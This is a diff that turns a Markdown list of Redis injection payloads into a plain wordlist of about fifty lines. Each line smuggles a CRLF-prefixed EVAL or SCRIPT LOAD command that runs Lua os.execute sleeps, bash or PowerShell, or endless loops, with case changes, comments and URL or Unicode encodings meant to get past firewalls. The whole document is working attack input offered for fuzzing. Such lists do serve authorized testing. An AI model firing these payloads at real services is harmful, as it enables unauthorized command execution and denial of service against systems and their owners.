@@ -1,105 +1,50 @@
-# Redis
-
-These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.
-
-- **\r\nEVAL "os.execute('sleep 5')" 0**  
-  Standard Lua OS sleep.
-- **\r\nEVAL "redis.call('ping'); os.execute('sleep 5')" 0**  
-  Ping + sleep.
-- **\r\neVaL "Os.ExEcUtE('sLeEp 5')" 0**  
-  Case variation Lua.
-- **%0D%0AEVAL%20%22os.execute%28%27sleep%205%27%29%22%200**  
-  URL-encoded EVAL.
-- **\r\nEVAL/*comment*/"os.execute('sleep 5')" 0**  
-  Lua comment EVAL.
-- **\r\nEVAL "os.execute('sleep 5')"/* */0**  
-  Param comment.
-- **\r\nEVAL "if true then os.execute('sleep 5') end" 0**  
-  If conditional sleep.
-- **\r\nEVAL "redis.pcall('os.execute','sleep 5')" 0**  
-  PCALL sleep.
-- **\u000D\u000AEVAL "os.execute('sleep 5')" 0**  
-  Unicode CRLF EVAL.
-- **\r\nEVAL "local t = os.clock() while os.clock() - t <= 5 do end" 0**  
-  Clock while loop.
-- **\r\nEVAL "for i=1,math.huge do end" 0**  
-  Infinite for loop.
-- **%250D%250AEVAL%2520%2522os.execute%2528%2527sleep%25205%2527%2529%2522%25200**  
-  Double URL EVAL.
-- **\r\nSCRIPT LOAD "os.execute('sleep 5')"**  
-  SCRIPT LOAD sleep.
-- **\r\nEVALSHA sha "os.execute('sleep 5')" 0**  
-  EVALSHA sleep.
-- **\r\nEVAL "os.execute('ping -n 5 127.0.0.1')" 0**  
-  Ping command sleep.
-- **\r\nEVAL "os.execute('sleep'..' 5')" 0**  
-  Concat sleep.
-- **\r\nEVAL "os . execute('sleep 5')" 0**  
-  Spaced OS.
-- **\r\nEVAL/**/"os.execute('sleep 5')" 0**  
-  Comment wrap EVAL.
-- **\r\nEVAL "os.execute/* */('sleep 5')" 0**  
-  Param comment sleep.
-- **\r\nEVAL "os.execute('s l e e p 5')" 0**  
-  Spaced command.
-- **\r\nEVAL "require('os').execute('sleep 5')" 0**  
-  Require OS sleep.
-- **\r\nEVAL "os.execute('timeout 5')" 0**  
-  Windows timeout.
-- **\r\nEVAL "for i=1,1000000000 do end" 0**  
-  Long for loop.
-- **\r\nEVAL "while true do end" 0**  
-  Infinite while.
-- **%0d%0aEVAL "os.execute('sleep 5')" 0**  
-  LF-only EVAL.
-- **\r\nEVAL "os.execute('sleep 10')" 0**  
-  Longer sleep.
-- **\r\nEVAL "if 1==1 then os.execute('sleep 5') end" 0**  
-  Number if sleep.
-- **\r\nEVAL "redis.call('set','key','val'); os.execute('sleep 5')" 0**  
-  Set + sleep.
-- **\r\nEVAL "os.execute('sleep 5') -- comment" 0**  
-  Lua dash comment.
-- **\r\nEVAL "os.execute('sleep 5') # " 0**  
-  Lua hash comment.
-- **\u000D\u000AEVAL\u0020\u0022os.execute\u0028\u0027sleep\u00205\u0027\u0029\u0022\u00200**  
-  Unicode full EVAL.
-- **\r\nEVAL "os.execute(concat('sleep ','5'))" 0**  
-  Concat param.
-- **\r\nEVAL "local os = require('os'); os.execute('sleep 5')" 0**  
-  Local require.
-- **\r\nEVAL "os.execute('bash -c \"sleep 5\"')" 0**  
-  Bash exec.
-- **\r\nEVAL "os.execute('powershell Start-Sleep -s 5')" 0**  
-  Powershell sleep.
-- **\r\nEVAL "for i=1,math.pow(10,9) do local x=i end" 0**  
-  Pow loop.
-- **\r\nEVAL "collectgarbage(); os.execute('sleep 5')" 0**  
-  Garbage + sleep.
-- **\r\nEVAL "os.execute('sleep 5'); return 1" 0**  
-  Return after sleep.
-- **\r\nEVAL "return os.execute('sleep 5')" 0**  
-  Return sleep.
-- **%25250D%25250AEVAL%252520%252522os.execute%252528%252527sleep%2525205%252527%252529%252522%2525200**  
-  Triple URL.
-- **\r\nEVAL "os.execute('sleep 5') or 1" 0**  
-  Or logical.
-- **\r\nEVAL "1 and os.execute('sleep 5')" 0**  
-  And logical.
-- **\r\nEVAL "os.execute('sleep' .. ' 5')" 0**  
-  String concat.
-- **\r\nEVAL "os.execute(string.format('sleep %d',5))" 0**  
-  Format sleep.
-- **\r\nEVAL "local delay=5; os.execute('sleep '..delay)" 0**  
-  Local var sleep.
-- **\r\nEVAL "os.execute('sleep 5'); redis.call('ping')" 0**  
-  Ping after sleep.
-- **\r\nEVAL "redis.log(redis.LOG_NOTICE, 'delay'); os.execute('sleep 5')" 0**  
-  Log + sleep.
-- **\r\nEVAL "if redis.call('exists','key') then os.execute('sleep 5') end" 0**  
-  Exists conditional.
-- **\r\nEVAL "os.execute('sleep 5') --" 0**  
-  Trailing dash.
-- **\r\nEVAL "os.execute('sleep 5') //" 0**  
-  Trailing line comment.
-
+\r\nEVAL "os.execute('sleep 5')" 0
+\r\nEVAL "redis.call('ping'); os.execute('sleep 5')" 0
+\r\neVaL "Os.ExEcUtE('sLeEp 5')" 0
+%0D%0AEVAL%20%22os.execute%28%27sleep%205%27%29%22%200
+\r\nEVAL/comment/"os.execute('sleep 5')" 0
+\r\nEVAL "os.execute('sleep 5')"/* */0
+\r\nEVAL "if true then os.execute('sleep 5') end" 0
+\r\nEVAL "redis.pcall('os.execute','sleep 5')" 0
+\u000D\u000AEVAL "os.execute('sleep 5')" 0
+\r\nEVAL "local t = os.clock() while os.clock() - t <= 5 do end" 0
+\r\nEVAL "for i=1,math.huge do end" 0
+%250D%250AEVAL%2520%2522os.execute%2528%2527sleep%25205%2527%2529%2522%25200
+\r\nSCRIPT LOAD "os.execute('sleep 5')"
+\r\nEVALSHA sha "os.execute('sleep 5')" 0
+\r\nEVAL "os.execute('ping -n 5 127.0.0.1')" 0
+\r\nEVAL "os.execute('sleep'..' 5')" 0
+\r\nEVAL "os . execute('sleep 5')" 0
+\r\nEVAL/**/"os.execute('sleep 5')" 0
+\r\nEVAL "os.execute/* */('sleep 5')" 0
+\r\nEVAL "os.execute('s l e e p 5')" 0
+\r\nEVAL "require('os').execute('sleep 5')" 0
+\r\nEVAL "os.execute('timeout 5')" 0
+\r\nEVAL "for i=1,1000000000 do end" 0
+\r\nEVAL "while true do end" 0
+%0d%0aEVAL "os.execute('sleep 5')" 0
+\r\nEVAL "os.execute('sleep 10')" 0
+\r\nEVAL "if 1==1 then os.execute('sleep 5') end" 0
+\r\nEVAL "redis.call('set','key','val'); os.execute('sleep 5')" 0
+\r\nEVAL "os.execute('sleep 5') -- comment" 0
+\r\nEVAL "os.execute('sleep 5') # " 0
+\u000D\u000AEVAL\u0020\u0022os.execute\u0028\u0027sleep\u00205\u0027\u0029\u0022\u00200
+\r\nEVAL "os.execute(concat('sleep ','5'))" 0
+\r\nEVAL "local os = require('os'); os.execute('sleep 5')" 0
+\r\nEVAL "os.execute('bash -c "sleep 5"')" 0
+\r\nEVAL "os.execute('powershell Start-Sleep -s 5')" 0
+\r\nEVAL "for i=1,math.pow(10,9) do local x=i end" 0
+\r\nEVAL "collectgarbage(); os.execute('sleep 5')" 0
+\r\nEVAL "os.execute('sleep 5'); return 1" 0
+\r\nEVAL "return os.execute('sleep 5')" 0
+%25250D%25250AEVAL%252520%252522os.execute%252528%252527sleep%2525205%252527%252529%252522%2525200
+\r\nEVAL "os.execute('sleep 5') or 1" 0
+\r\nEVAL "1 and os.execute('sleep 5')" 0
+\r\nEVAL "os.execute('sleep' .. ' 5')" 0
+\r\nEVAL "os.execute(string.format('sleep %d',5))" 0
+\r\nEVAL "local delay=5; os.execute('sleep '..delay)" 0
+\r\nEVAL "os.execute('sleep 5'); redis.call('ping')" 0
+\r\nEVAL "redis.log(redis.LOG_NOTICE, 'delay'); os.execute('sleep 5')" 0
+\r\nEVAL "if redis.call('exists','key') then os.execute('sleep 5') end" 0
+\r\nEVAL "os.execute('sleep 5') --" 0
+\r\nEVAL "os.execute('sleep 5') //" 0
